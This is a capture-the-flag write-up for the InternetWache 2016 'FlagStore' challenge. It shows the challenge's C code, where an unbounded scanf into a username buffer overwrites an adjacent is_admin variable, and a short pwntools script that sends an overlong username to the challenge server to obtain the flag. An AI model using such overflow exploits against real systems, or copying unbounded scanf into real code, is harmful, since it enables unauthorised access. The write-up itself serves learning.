+++
authors = "kbeckmann"
categories = [ "writeups" ]
date = "2016-02-21T00:08:47+01:00"
title = "InternetWache 2016 FlagStore (Exploit 70) Writeup"

+++

# Problem

> Description: Here's the ultimate flag store. Store and retrieve your flags whenever you want.

(exp70, solved by 244)

Attachment: exp70.zip

Service: 188.166.133.53:12157

# Solution

The zip contains c-code for the challenge. Looking at it I immediately see an overflow and an interesting location for the `admin` flag.

~~~c++
char username[500];
int is_admin = 0; // <-- can be overwritten
char password[500];

...

printf("Enter an username:");
scanf("%s", username);

// scanf will overwrite username and is_admin
~~~

The exploit is to simply send a long username and a \x01 byte.

~~~
#!/usr/bin/env python2
from pwn import *

r = remote('188.166.133.53', 12157)

r.recvuntil('4\n')

r.sendline('1')
r.sendline('A'*499 + '\x00\x01')
r.sendline('A'*8)
r.sendline('2')
r.sendline('A'*499)
r.sendline('A'*8)
r.sendline('3')

print r.clean()
~~~

Your flag: **IW{Y_U_NO_HAZ_FLAG}**
